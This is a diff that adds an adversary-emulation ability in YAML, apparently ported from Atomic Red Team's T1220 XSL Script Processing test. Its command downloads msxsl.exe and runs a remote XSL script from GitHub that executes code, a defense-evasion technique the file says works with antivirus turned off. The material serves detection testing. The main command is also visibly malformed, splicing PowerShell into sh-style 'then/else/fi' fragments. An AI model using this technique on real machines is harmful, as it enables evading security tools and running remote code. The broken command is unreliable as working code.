@@ -1,0 +1,62 @@
+- id: a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985
+  name: MSXSL Bypass using remote files
+  description: 'Executes the code specified within a XSL script tag during XSL transformation
+    using a remote payload.
+
+    Requires download of MSXSL.exe. No longer available from Microsoft.
+
+    (Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714
+    )
+
+    Open Calculator.exe when test successfully executed, while AV turned off.'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1220
+    name: XSL Script Processing
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe")
+          {exit 0} else {exit 1}; then : ; else Invoke-WebRequest "https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe"; fi; "PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe"
+          "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml"
+          "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl"'
+        cleanup: 'del -Path #{msxsl_exe} >nul 2>&1'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1220
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      xmlfile:
+        description: Remote location (URL) of the test XML file.
+        type: url
+        default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
+      xslfile:
+        description: Remote location (URL) of the test XSL script file.
+        type: url
+        default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+      msxsl_exe:
+        description: Location of the MSXSL executable.
+        type: path
+        default: PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe
+    dependencies:
+    - description: 'msxsl.exe must exist on disk at specified location ("#{msxsl_exe}")
+
+        '
+      prereq_command: 'if (Test-Path "#{msxsl_exe}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'Invoke-WebRequest "https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe"
+        -OutFile "#{msxsl_exe}"
+
+        '
+    technique_created: '2018-10-17T00:14:20.652Z'
+    atomic_guid: a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985
+    import_timestamp: '2025-06-24T11:15:01.390856Z'
